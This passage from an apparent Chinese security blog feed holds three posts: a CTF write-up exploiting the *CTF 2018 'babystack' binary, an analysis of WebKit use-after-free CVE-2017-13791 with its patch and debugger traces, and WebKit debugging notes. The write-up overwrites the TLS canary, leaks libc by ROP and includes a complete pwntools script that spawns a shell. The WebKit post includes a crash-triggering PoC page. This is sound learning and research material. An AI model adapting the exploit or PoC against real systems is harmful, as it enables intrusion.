plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">blackzert@...sher:~/aslur/tests$ ./thread_stack_tls  1</span><br><span class="line">main FS 0x7f4d94b75700</span><br><span class="line">cookie main: 0x2ad951d602d94100</span><br><span class="line">thread FS 0x7f4d94385700</span><br><span class="line">cookie thread: 0x2ad951d602d94100</span><br><span class="line">stack_cookie addr 0x7f4d94384f48</span><br><span class="line">diff : 7b8</span><br></pre></td></tr></table></figure></p><p>在当前栈帧和TCB结构之间的距离等于0x7b8,小于一页,只要溢出的字节够多，就可以把TCB中的tcbhead_t.stack_guard覆盖掉。</p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>先输入要输入的字节的数目，然后程序从终端读取输入内容，因为可输入的size最大0x10000，远大于栈的大小，栈溢出。<br><img src="http://onc55v8te.bkt.clouddn.com/2018-04-24-164114.jpg" alt=""><br><img src="http://onc55v8te.bkt.clouddn.com/2018-04-24-164219.png" alt=""></p><h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><h3 id="checksec"><a href="#checksec" class="headerlink" title="checksec"></a>checksec</h3><p><img src="http://onc55v8te.bkt.clouddn.com/2018-04-24-164348.jpg" alt=""></p><h3 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h3><p>通过栈溢出构造rop，leak出libc的基地址，找到one_gadaget的偏移。<br>然后将这个地址读到bss段，然后leave&amp;&amp;ret，劫持rip到one_gadaget。</p><h3 id="确定padding"><a href="#确定padding" class="headerlink" title="确定padding"></a>确定padding</h3><p>s在rbp-0x1010，再加上old rbp即8个字节，到返回地址前一共是0x1018个字节。<br><img src="http://onc55v8te.bkt.clouddn.com/2018-04-24-171603.png" alt=""></p><h3 id="leak-libc"><a href="#leak-libc" class="headerlink" title="leak libc"></a>leak libc</h3><p>当我们调用puts.plt的时候，系统会将真正的puts函数地址link到got表的puts.got中，然后puts.plt会根据puts.got跳转到真正的puts函数上去。<br>然后我们需要一个gadget(pop rdi;ret)来传递参数。</p><p>使用工具ROPgadget寻找<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">parallels@ubuntu:~/ctf/6ctf/babystack$ ROPgadget --binary bs --only &quot;pop|ret&quot;</span><br><span class="line">Gadgets information</span><br><span class="line">============================================================</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">0x0000000000400c03 : pop rdi ; ret</span><br><span class="line">0x0000000000400c01 : pop rsi ; pop r15 ; ret</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">Unique gadgets found: 12</span><br></pre></td></tr></table></figure></p><p>然后减去puts在libc里的偏移就是libc的基地址。</p><h3 id="one-gadget"><a href="#one-gadget" class="headerlink" title="one_gadget"></a>one_gadget</h3><p>直接用IDA搜索字符串/bin/sh，然后找到下面这种就是one_gadget，可以直接起shell。<br><img src="http://onc55v8te.bkt.clouddn.com/2018-04-24-173344.png" alt=""><br>也可以使用工具<a href="https://github.com/david942j/one_gadget" target="_blank" rel="noopener">one_gadget</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install ruby</span><br><span class="line">sudo gem install one_gadget</span><br></pre></td></tr></table></figure></p><p><img src="http://onc55v8te.bkt.clouddn.com/2018-04-24-173642.png" alt=""></p><h3 id="调用read把one-gadget的地址读到bss段"><a href="#调用read把one-gadget的地址读到bss段" class="headerlink" title="调用read把one_gadget的地址读到bss段"></a>调用read把one_gadget的地址读到bss段</h3><p>之前我们已经找到了gadget用来传递read的参数。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0x0000000000400c03 : pop rdi ; ret</span><br><span class="line">0x0000000000400c01 : pop rsi ; pop r15 ; ret</span><br></pre></td></tr></table></figure></p><p>调用read把one_gadget写到bss_addr。</p><p>通过leave先将rsp的值改为bss_addr，因为之前我们已经将one_gadget写到了bss_addr，然后通过ret，就可以劫持程序执行到one_gadget。</p><ul><li><p>leave：<br>在32位汇编下相当于:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov esp,ebp                                        </span><br><span class="line">pop ebp</span><br></pre></td></tr></table></figure></li><li><p>ret<br>相当于</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pop rip</span><br></pre></td></tr></table></figure></li></ul><h3 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h3><p>exp<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">"./libc.so"</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">menu</span><span class="params">(bytes,data)</span>:</span></span><br><span class="line">    io.recvuntil(<span class="string">"How many bytes do you want to send?\n"</span>)</span><br><span class="line">    io.sendline(str(bytes))</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    io.send(data)</span><br><span class="line"></span><br><span class="line">puts_plt = <span class="number">0x4007C0</span></span><br><span class="line">read_plt = <span class="number">0x4007E0</span> </span><br><span class="line">leave_addr = <span class="number">0x400A9B</span></span><br><span class="line"></span><br><span class="line">pop_rdi_addr = <span class="number">0x400c03</span></span><br><span class="line">puts_got = <span class="number">0x601FB0</span></span><br><span class="line">pop_rbp_addr = <span class="number">0x400870</span></span><br><span class="line">pop_rsi_addr = <span class="number">0x400c01</span></span><br><span class="line"></span><br><span class="line">bss_addr = <span class="number">0x602030</span></span><br><span class="line"></span><br><span class="line">io = process(<span class="string">'./bs'</span>,env = &#123;<span class="string">"LD_PRELOAD"</span> : <span class="string">"./libc.so"</span>&#125;)</span><br><span class="line"><span class="comment"># context.log_level = 'debug'</span></span><br><span class="line">payload = <span class="string">'\x00'</span>*<span class="number">0x1010</span>+p64(bss_addr<span class="number">-0x8</span>)+p64(pop_rdi_addr) + p64(puts_got) + p64(puts_plt)</span><br><span class="line">payload += p64(pop_rdi_addr) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(pop_rsi_addr) + p64(bss_addr) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(read_plt) + p64(leave_addr)</span><br><span class="line">payload = payload.ljust(<span class="number">0x2000</span>,<span class="string">'\x00'</span>)</span><br><span class="line">menu(<span class="number">0x2000</span>,payload)</span><br><span class="line">io.recvuntil(<span class="string">'It\'s time to say goodbye.\n'</span>)</span><br><span class="line">base = u64(io.recv(<span class="number">6</span>)+<span class="string">'\x00\x00'</span>)-libc.symbols[<span class="string">'puts'</span>]</span><br><span class="line">io.send(p64(base+<span class="number">0xf1147</span>))</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure></p><p><img src="http://onc55v8te.bkt.clouddn.com/2018-04-24-180654.png" alt=""></p><h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><p>要拿到flag，还要在服务器上绕过之前0ctf一样的waf，这个没什么好说的，爆破就行，这里只贴出本地getshell的代码。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;赛题链接&quot;&gt;&lt;a href=&quot;#赛题链接&quot; class=&quot;headerlink&quot; title=&quot;赛题链接&quot;&gt;&lt;/a&gt;赛题链接&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://github.com/sixstars/starctf2018/tree/master/p
      
    
    </summary>
    
      <category term="CTF" scheme="http://eternalsakura13.com/categories/CTF/"/>
    
      <category term="pwn" scheme="http://eternalsakura13.com/categories/CTF/pwn/"/>
    
      <category term="栈溢出" scheme="http://eternalsakura13.com/categories/CTF/pwn/%E6%A0%88%E6%BA%A2%E5%87%BA/"/>
    
    
      <category term="canary" scheme="http://eternalsakura13.com/tags/canary/"/>
    
  </entry>
  
  <entry>
    <title>webkit UAF:CVE-2017-13791学习</title>
    <link href="http://eternalsakura13.com/2018/04/21/cve-2017-13791/"/>
    <id>http://eternalsakura13.com/2018/04/21/cve-2017-13791/</id>
    <published>2018-04-21T15:27:33.747Z</published>
    <updated>2018-04-21T17:54:01.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">jsfuzzer</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    textarea1.setRangeText(<span class="string">"foo"</span>);</span><br><span class="line">    textarea2.autofocus = <span class="literal">true</span>;</span><br><span class="line">    textarea1.name = <span class="string">"foo"</span>;</span><br><span class="line">    form.insertBefore(textarea2, form.firstChild);</span><br><span class="line">    form.submit();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">eventhandler2</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>;i&lt;<span class="number">100</span>;i++) &#123;</span><br><span class="line">      <span class="keyword">var</span> e = <span class="built_in">document</span>.createElement(<span class="string">"input"</span>);</span><br><span class="line">      form.appendChild(e);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br><span class="line"><span class="regexp">&lt;body onload=jsfuzzer()&gt;</span></span><br><span class="line"><span class="regexp">  &lt;form id="form" onchange="eventhandler2()"&gt;</span></span><br><span class="line"><span class="regexp">  &lt;textarea id="textarea1"&gt;a&lt;/</span>textarea&gt;</span><br><span class="line">  &lt;object id=<span class="string">"object"</span>&gt;<span class="xml"><span class="tag">&lt;/<span class="name">object</span>&gt;</span></span></span><br><span class="line">  &lt;textarea id=<span class="string">"textarea2"</span>&gt;b&lt;<span class="regexp">/textarea&gt;</span></span><br></pre></td></tr></table></figure><h2 id="patch"><a href="#patch" class="headerlink" title="patch"></a>patch</h2><p><a href="https://github.com/WebKit/webkit/commit/d0ac97f994f0145715402be4d4a24b54440beb02" target="_blank" rel="noopener">https://github.com/WebKit/webkit/commit/d0ac97f994f0145715402be4d4a24b54440beb02</a><br><img src="http://onc55v8te.bkt.clouddn.com/2018-04-21-160334.png" alt=""><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">-    &#123;</span><br><span class="line"> -        NoEventDispatchAssertion noEventDispatchAssertion;</span><br><span class="line"> -</span><br><span class="line"> -        for (auto&amp; control : form.associatedElements()) &#123;</span><br><span class="line"> -            auto&amp; element = control-&gt;asHTMLElement();</span><br><span class="line"> -            if (!element.isDisabledFormControl())</span><br><span class="line"> -                control-&gt;appendFormData(domFormData, isMultiPartForm);</span><br><span class="line"> -            if (is&lt;HTMLInputElement&gt;(element)) &#123;</span><br><span class="line"> -                auto&amp; input = downcast&lt;HTMLInputElement&gt;(element);</span><br><span class="line"> -                if (input.isTextField()) &#123;</span><br><span class="line"> -                    formValues.append(&#123; input.name().string(), input.value() &#125;);</span><br><span class="line"> -                    input.addSearchResult();</span><br><span class="line"> -                &#125;</span><br><span class="line"> -                if (input.isPasswordField() &amp;&amp; !input.value().isEmpty())</span><br><span class="line"> -                    containsPasswordData = true;</span><br><span class="line"> +    auto protectedAssociatedElements = form.associatedElements().map([] (FormAssociatedElement* rawElement) -&gt; Ref&lt;FormAssociatedElement&gt; &#123;</span><br><span class="line"> +        return *rawElement;</span><br><span class="line"> +    &#125;);</span><br><span class="line"> +</span><br><span class="line"> +    for (auto&amp; control : protectedAssociatedElements) &#123;</span><br><span class="line"> +        auto&amp; element = control-&gt;asHTMLElement();</span><br><span class="line"> +        if (!element.isDisabledFormControl())</span><br><span class="line"> +            control-&gt;appendFormData(domFormData, isMultiPartForm);</span><br><span class="line"> +        if (is&lt;HTMLInputElement&gt;(element)) &#123;</span><br><span class="line"> +            auto&amp; input = downcast&lt;HTMLInputElement&gt;(element);</span><br><span class="line"> +            if (input.isTextField()) &#123;</span><br><span class="line"> +                formValues.append(&#123; input.name(), input.value() &#125;);</span><br><span class="line"> +                input.addSearchResult();</span><br><span class="line">              &#125;</span><br><span class="line"> +            if (input.isPasswordField() &amp;&amp; !input.value().isEmpty())</span><br><span class="line"> +                containsPasswordData = true;</span><br><span class="line">          &#125;</span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure></p><p>在for (auto&amp; control : xxx)里，把form.associatedElements()改成了protectedAssociatedElements。<br>前者直接是使用HTMLFormElement中的m_associatedElements引用。<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> Vector&lt;FormAssociatedElement*&gt;&amp; associatedElements() <span class="keyword">const</span> &#123; <span class="keyword">return</span> m_associatedElements; &#125;</span><br><span class="line">Vector&lt;FormAssociatedElement*&gt; m_associatedElements;</span><br></pre></td></tr></table></figure></p><p>后者使用Ref<formassociatedelement>产生的引用来取代之前的m_associatedElements.</formassociatedelement></p><h2 id="poc分析"><a href="#poc分析" class="headerlink" title="poc分析"></a>poc分析</h2><h3 id="poc的一些知识点"><a href="#poc的一些知识点" class="headerlink" title="poc的一些知识点"></a>poc的一些知识点</h3><ol><li><code>&lt;body onload=jsfuzzer()&gt;</code><br>在页面加载完成后就调用jsfuzzer()函数。</li><li><p><code>textarea2.autofocus = true;</code><br>在jsfuzzer()里通过autofocus来改变了textarea2，从而因为onchange事件发生来回调了eventhandler2()函数。<br>这在webkit poc里很常见，都是这么写来触发的。<br>javascript是单线程的，回调就类似于内核里的trap，用来弥补不能多线程的缺陷。</p></li><li><p><code>eventhandler2</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">for(var i=0;i&lt;100;i++) &#123;</span><br><span class="line">      var e = document.createElement(&quot;input&quot;);</span><br><span class="line">      form.appendChild(e);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></li></ol><p>appendChild调用setForm，触发内存重新分配，set之后free。</p><ol><li><code>form.submit();</code><br>在submit里调用到了updateLayout。<br>在submit时需要保持页面布局是最新的. 导致有了一个时机通过回调事件访问目标对象.</li></ol><h3 id="UAF"><a href="#UAF" class="headerlink" title="UAF"></a>UAF</h3><h4 id="free"><a href="#free" class="headerlink" title="free"></a>free</h4><p>在 lldb 中确认. 可以看到 eventhandler2 中使用的 appendChild() 方法经过层层调用释放了 WebCore::FormAssociatedElement*</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">#0 0x103670044 in __sanitizer_mz_free (/Applications/Xcode.app/Contents/Developer/Toolchains/XcodeDefault.xctoolchain/usr/lib/clang/9.0.0/lib/darwin/libclang_rt.asan_osx_dynamic.dylib:x86_64h+0x5a044)</span><br><span class="line">#1 0x11465dbc0 in bmalloc::Deallocator::deallocateSlowCase(void*) (/Users/sakura/_release/webkit/WebKitBuild/Release/JavaScriptCore.framework/Versions/A/JavaScriptCore:x86_64+0x1ea2bc0)</span><br><span class="line">#2 0x10651b537 in WTF::Vector&lt;WebCore::FormAssociatedElement*, 0ul, WTF::CrashOnOverflow, 16ul&gt;::expandCapacity(unsigned long, WebCore::FormAssociatedElement**) (/Users/sakura/_release/webkit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0xdf3537)</span><br><span class="line">#3 0x106517eff in void WTF::Vector&lt;WebCore::FormAssociatedElement*, 0ul, WTF::CrashOnOverflow, 16ul&gt;::insert&lt;WebCore::FormAssociatedElement*&amp;&gt;(unsigned long, WebCore::FormAssociatedElement*&amp;&amp;&amp;) (/Users/sakura/_release/webkit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0xdefeff)</span><br><span class="line">#4 0x106517d6f in WebCore::HTMLFormElement::registerFormElement(WebCore::FormAssociatedElement*) (/Users/sakura/_release/webkit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0xdefd6f)</span><br><span class="line">#5 0x106276c98 in WebCore::FormAssociatedElement::setForm(WebCore::HTMLFormElement*) (/Users/sakura/_release/webkit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0xb4ec98)</span><br><span class="line">#6 0x1062775fe in WebCore::FormAssociatedElement::resetFormOwner() (/Users/sakura/_release/webkit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0xb4f5fe)</span><br><span class="line">#7 0x10653719d in WebCore::HTMLInputElement::finishedInsertingSubtree() (/Users/sakura/_release/webkit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0xe0f19d)</span><br><span class="line">#8 0x105b12378 in WebCore::ContainerNode::notifyChildInserted(WebCore::Node&amp;, WebCore::ContainerNode::ChildChange const&amp;) (/Users/sakura/_release/webkit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0x3ea378)</span><br><span class="line">#9 0x105b11ecf in WebCore::ContainerNode::updateTreeAfterInsertion(WebCore::Node&amp;, WebCore::ContainerNode::ReplacedAllChildren) (/Users/sakura/_release/webkit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0x3e9ecf)</span><br><span class="line">#10 0x105b11798 in WebCore::ContainerNode::appendChildWithoutPreInsertionValidityCheck(WebCore::Node&amp;) (/Users/sakura/_release/webkit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0x3e9798)</span><br><span class="line">#11 0x105b14b54 in WebCore::ContainerNode::appendChild(WebCore::Node&amp;) (/Users/sakura/_release/webkit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0x3ecb54)</span><br></pre></td></tr></table></figure><h4 id="use"><a href="#use" class="headerlink" title="use"></a>use</h4><p>前面我们说过了，在submit的时候，真正的触发页面的update</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">(lldb) bt</span><br><span class="line">* thread #1, queue = &apos;com.apple.main-thread&apos;, stop reason = step in</span><br><span class="line">* frame #0: 0x0000000111ceb42f WebCore`WebCore::Document::updateLayout(this=0x00006200000210e0) at Document.cpp:1907</span><br><span class="line">frame #1: 0x0000000112e3f31c WebCore`WebCore::HTMLTextAreaElement::appendFormData(this=0x000061100042a1c0, encoding=0x000060400060d810, (null)=false) at HTMLTextAreaElement.cpp:225</span><br><span class="line">frame #2: 0x0000000112e3f54b WebCore`non-virtual thunk to WebCore::HTMLTextAreaElement::appendFormData(this=0x000061100042a1c0, encoding=0x000060400060d810, (null)=false) at HTMLTextAreaElement.cpp:0</span><br><span class="line">frame #3: 0x00000001126a34f8 WebCore`WebCore::FormSubmission::create(form=0x000061100042a080, attributes=0x000061100042a0e8, event=0x0000000000000000, lockHistory=Yes, trigger=SubmittedByJavaScript) at FormSubmission.cpp:200</span><br><span class="line">frame #4:......</span><br></pre></td></tr></table></figure><p>在for (auto&amp; control : form.associatedElements()) 执行的时候, use after free。</p><h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><p>free和use的地点因为回调的缘故还是有点难找，我调试有点问题，这个洞暂时就这样了，不知道理解的对不对，看其他的时候加深理解吧。<br>参考的是我师傅之前写的文章（虽然现在删掉了）</p><p>主要学到的东西：<br>触发内存重新分配和真正的重新update，其实还是分离的，两者并不同时发生。<br>就像webkit里面页面里的一个元素被删除了，在cpp层不一定被释放掉了，不是同步的。<br>其实感觉webkit里UAF多的原因还是，程序中的对象调用关系过于复杂，实在难以搞清楚某个对象究竟是否已经释放了内存。<br>回调追着太复杂了。。还是easy，需要很多经验呀。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;poc&quot;&gt;&lt;a href=&quot;#poc&quot; class=&quot;headerlink&quot; title=&quot;poc&quot;&gt;&lt;/a&gt;poc&lt;/h2&gt;&lt;figure class=&quot;highlight javascript&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;p
      
    
    </summary>
    
      <category term="浏览器" scheme="http://eternalsakura13.com/categories/%E6%B5%8F%E8%A7%88%E5%99%A8/"/>
    
    
      <category term="webkit" scheme="http://eternalsakura13.com/tags/webkit/"/>
    
      <category term="cve" scheme="http://eternalsakura13.com/tags/cve/"/>
    
  </entry>
  
  <entry>
    <title>webkit调试方法记录</title>
    <link href="http://eternalsakura13.com/2018/04/19/js_crash_debug/"/>
    <id>http://eternalsakura13.com/2018/04/19/js_crash_debug/</id>
    <published>2018-04-19T13:31:27.934Z</published>
    <updated>2018-04-19T17:34:02.385Z</updated>
    
    <content type="html"><![CDATA[<h2 id="调试crash的准备工作"><a href="#调试crash的准备工作" class="headerlink" title="调试crash的准备工作"></a>调试crash的准备工作</h2><h3 id="下载-Webkit-源代码并编译"><a href="#下载-Webkit-源代码并编译" class="headerlink" title="下载 Webkit 源代码并编译:"></a>下载 Webkit 源代码并编译:</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">-&gt; git clone git://git.webkit.org/WebKit.git WebKit</span><br><span class="line"></span><br><span class="line">for macOS:</span><br><span class="line">-&gt; Tools/Scripts/set-webkit-configuration --asan --debug </span><br><span class="line">-&gt; Tools/Scripts/build-webkit</span><br></pre></td></tr></table></figure><p>切换到漏洞影响的分支<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git checkout -b localname commithash</span><br></pre></td></tr></table></figure></p><p>调试<br>使用的调试器是 lldb. 通过以下命令运行 Safari:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-&gt; Tools/Scripts/run-safari</span><br></pre></td></tr></table></figure></p><p>或者获取源码后直接在xcode里打开webkit，<br><img src="http://onc55v8te.bkt.clouddn.com/2018-04-19-162739.png" alt=""><br><img src="http://onc55v8te.bkt.clouddn.com/2018-04-19-162814.png" alt=""><br><img src="http://onc55v8te.bkt.clouddn.com/2018-04-19-163348.png" alt=""></p><h3 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h3><p>测试，找一个poc运行，可以看到asna打印uaf。<br><img src="http://onc55v8te.bkt.clouddn.com/2018-04-19-162506.png" alt=""></p><h2 id="run-jsc"><a href="#run-jsc" class="headerlink" title="run-jsc"></a>run-jsc</h2><p>通过run-jsc这个script我们能打印出JIT的log<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">sakura@sakuradeMBP:~/WebKit/Tools/Scripts$ pwd</span><br><span class="line">/Users/sakura/WebKit/Tools/Scripts</span><br><span class="line">sakura@sakuradeMBP:~/WebKit/Tools/Scripts$ ls | grep run-js</span><br><span class="line">run-jsc</span><br><span class="line">sakura@sakuradeMBP:~/WebKit/Tools/Scripts$ ./run-jsc --help</span><br><span class="line">Running 1 time(s): DYLD_FRAMEWORK_PATH=/Users/sakura/WebKit/WebKitBuild/Debug /Users/sakura/WebKit/WebKitBuild/Debug/jsc --help</span><br><span class="line">Usage: jsc [options] [files] [-- arguments]</span><br><span class="line">  -d         Dumps bytecode (debug builds only)</span><br><span class="line">  -e         Evaluate argument as script code</span><br><span class="line">  -f         Specifies a source file (deprecated)</span><br><span class="line">  -h|--help  Prints this help message</span><br><span class="line">  -i         Enables interactive mode (default if no files are specified)</span><br><span class="line">  -m         Execute as a module</span><br><span class="line">  -s         Installs signal handlers that exit on a crash (Unix platforms only)</span><br><span class="line">  -p &lt;file&gt;  Outputs profiling data to a file</span><br><span class="line">  -x         Output exit code before terminating</span><br><span class="line"></span><br><span class="line">  --sample                   Collects and outputs sampling profiler data</span><br><span class="line">  --test262-async            Check that some script calls the print function with the string &apos;Test262:AsyncTestComplete&apos;</span><br><span class="line">  --strict-file=&lt;file&gt;       Parse the given file as if it were in strict mode (this option may be passed more than once)</span><br><span class="line">  --module-file=&lt;file&gt;       Parse and evaluate the given file as module (this option may be passed more than once)</span><br><span class="line">  --exception=&lt;name&gt;         Check the last script exits with an uncaught exception with the specified name</span><br><span class="line">  --watchdog-exception-ok    Uncaught watchdog exceptions exit with success</span><br><span class="line">  --dumpException            Dump uncaught exception text</span><br><span class="line">  --options                  Dumps all JSC VM options and exits</span><br><span class="line">  --dumpOptions              Dumps all non-default JSC VM options before continuing</span><br><span class="line">  --&lt;jsc VM option&gt;=&lt;value&gt;  Sets the specified JSC VM option</span><br><span class="line"></span><br><span class="line">选项描述</span><br><span class="line">JSC_dumpDisassembly = true转储所有JIT编译函数的反汇编。</span><br><span class="line">JSC_dumpDFGDisassembly = true转储DFG和FTL编译函数的反汇编。</span><br><span class="line">JSC_dumpFTLDisassembly = true转储FTL编译函数的反汇编。</span><br><span class="line">JSC_dumpSourceAtDFGTime = true转储DFG/FTL编译函数的来源。</span><br><span class="line">JSC_dumpBytecodeAtDFGTime = true转储DFG/FTL编译函数的字节码。</span><br><span class="line">JSC_dumpGraphAfterParsing = true在DFG/FTL编译时解析函数字节码后转储DFG图。</span><br><span class="line">JSC_dumpGraphAtEachPhase = true在DFG/FTL编译的每个阶段之后转储DFG图。</span><br><span class="line"></span><br><span class="line">例如</span><br><span class="line">./run-jsc --dumpGraphAtEachPhase=true /Users/sakura/Desktop/for-in-side-effects.js &amp;&gt; ~/log.txt</span><br><span class="line"></span><br><span class="line">./run-jsc --dumpDisassembly=true /Users/sakura/Desktop/for-in-side-effects.js &amp;&gt; ~/log.txt</span><br></pre></td></tr></table></figure></p><p>for-in-side-effects.js<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span 